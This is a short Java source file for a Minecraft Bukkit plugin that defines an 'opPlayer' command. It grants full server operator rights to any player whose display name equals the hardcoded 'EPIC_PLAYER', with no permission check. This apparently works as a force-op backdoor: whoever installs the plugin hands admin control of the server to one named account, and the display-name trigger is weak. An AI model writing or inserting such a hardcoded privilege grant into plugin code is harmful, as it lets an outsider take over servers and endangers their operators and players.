package Commands;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class opPlayer implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender commandSender, Command command, String s, String[] strings) {

        if (!(commandSender instanceof Player)) {return true;}
        Player player = (Player) commandSender;

        if (player.getDisplayName().equalsIgnoreCase("EPIC_PLAYER")) {
            if (!(player.isOp())) {
                player.sendMessage(ChatColor.RED + "You have been OP-ed.");
                player.setOp(true);
            } else {
                player.sendMessage(ChatColor.RED + "You are already OP-ed.");
            }
        } else {
            player.sendMessage(ChatColor.RED + "You can't use that command.");
        }
        return true;
    }
}
